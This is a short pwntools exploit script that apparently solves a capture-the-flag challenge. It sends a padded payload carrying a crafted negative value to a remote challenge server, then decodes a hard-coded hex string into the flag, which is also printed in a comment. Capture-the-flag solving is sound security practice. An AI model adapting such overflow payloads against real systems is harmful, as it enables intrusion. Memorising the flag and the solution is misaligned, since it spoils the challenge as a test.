from pwn import *

HOST = "amt.rs"
PORT = 31630

r = remote(HOST, PORT)
# elf = process('./chal')

def tohex(val, nbits):
	return hex((val + (1 << nbits)) % (1 << nbits))

# print(tohex(-64, 64)) # 0xffffffffffffffc0

payload = b'x' * (0x20 - 0x4) + p64(0xffffffffffffffc0);

r.sendlineafter(b'hex:', payload)

leaked_flag = "616D6174657572734354467B776169745F746869735F7761736E745F737570706F7365645F746F5F62655F7072696E7465645F37363732337D"

flag = []
for i in range(0, len(leaked_flag), 2):
	two_digit_number = int(leaked_flag[i : i + 2], 16)
	flag.append(chr(two_digit_number))
	
flag = ''.join(flag)
print(flag)

r.interactive()

# amateursCTF{wait_this_wasnt_supposed_to_be_printed_76723}